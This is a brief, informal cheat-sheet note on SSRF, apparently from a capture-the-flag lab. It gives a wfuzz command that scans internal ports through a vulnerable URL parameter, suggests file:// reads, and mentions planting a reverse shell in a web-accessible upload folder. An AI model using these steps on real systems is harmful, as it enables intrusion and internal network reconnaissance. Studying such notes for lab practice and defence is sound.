# **SSRF**

SSRF  
-----------  
Internal file disclosure by browsing---  
Try: ?file://  
then wfuzz -c -z range,1-65366 -hl 2 [http://](http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ)x.x.x.x  
Try: ?[http://localhost/<>.php](http://localhost/%3C%3E.php)  
look for uploads folder/ or folder that is accessible from web so that rshell can upload to victim with SSRF and can be run from web  
  
if have private browser app  
--------------------------------  
  
then wfuzz -c -z range,1-65366 -hl 2 [http://](http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ)x.x.x.x  
  
hl = hide 2 C